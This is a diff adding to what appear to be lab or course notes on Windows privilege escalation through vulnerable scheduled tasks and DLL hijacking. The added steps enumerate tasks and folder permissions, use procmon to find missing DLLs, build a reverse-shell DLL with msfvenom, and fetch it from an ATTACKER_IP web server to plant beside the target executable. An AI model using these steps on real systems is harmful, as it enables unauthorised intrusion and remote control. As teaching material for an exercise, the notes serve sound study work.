@@ -37,15 +37,69 @@ When a process wants to perform an action higher than its current integrity leve
 - Notify me only when programs try to make changes to my computer
 - Notify me only when programs try to make changes to my computer (do not dim my desktop)
 - Never notify
+
+Checking UAC Settings: reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
 ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+Scheduled Tasks & Services
+Item To Evaluate:
 
+- Write Permissions
+- Non-Standard Locations
+- Unquoted Executable Paths
+- Vulnerabilities in Executables
+- Permissions to Run As SYSTEM
 ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+Finding Vulnerable Scheduled Tasks
+When looking for vulnerabilities associated with scheduled tasks, it is important to look for the following associated configurations within the Scheduled Tasks...
+- "Run As User"
+- "Task To Run"
 
 
+STEP 1.) IDENTIFY VULNERABLE TASKS
+- schtasks /query /fo LIST /v
+
+- schtasks /query /fo LIST /v | Select-String -Pattern "STRING OR REGEX PATTERN"
+
+- schtasks /query /fo LIST /v | Select-String -Pattern "Task To Run" -CaseSensitive -Context 0,6
+      - Searches for Task To Run and outputs that line, along with the 6 lines following it in order to show the Run As User setting too.
+
+- schtasks /query /fo LIST /v | Select-String -Pattern "Task To Run" -CaseSensitive |Select-String -Pattern "COM handler" -NotMatch
+      - Excludes results that we dont want to see in order to help narrow down vulnerable directory locations.
+
+STEP 2.) OBTAIN VALUABLE INFO 
+- sigcheck c:\users\student\exercise_2\<vulnerable_task.exe>
+
+STEP 3.) CHECK TO SEE IF DIRECTORY CAN BE WRITTEN TO
+- icacls c:\users\student\exercise_2
 ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+DLL Hijacking
 
+STEP 4.) 
+- procmon /AcceptEula
+
+STEP 5.)
+- C:\Users\student\exercise_2\<vulnerable_task.exe>
+      - Configure the following filters by pressing CTRL + L to open the filter menu:
+        - Process Name contains putty.exe
+        - Path contains .dll
+        - Result is NAME NOT FOUND
 ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+Creating Malicious DLL
 
+STEP 6.) DLL CREATION USING MSFVENOM
+- msfvenom -p windows/shell_reverse_tcp LHOST=10.50.x.x LPORT=<xxxx> -f dll > bad.dll
+
+*** Once the malicious dll has been createdit must be uploaded to the host. Use scp, ftp, nc, python simple HTTP server, or copying and pasting base64 dump of file. ***
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+Transferring the DLL
+
+STEP 7.) TRANSFER DLL TO TARGET MACHINE
+- Create a Simple HTTP server, and then browse to it from the target:
+      - On Machine with DLL: python -m SimpleHTTPServer 8000
+      - On Target: Browse to http://ATTACKER_IP:8000
+
+STEP 8.) Put the retrieved DLL in the same location as vulnerable_task.exe
+- "PATH OF MALICIOUS DLL" "c:\users\student\exercise_2\SSPICLI.dll"
 ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
 
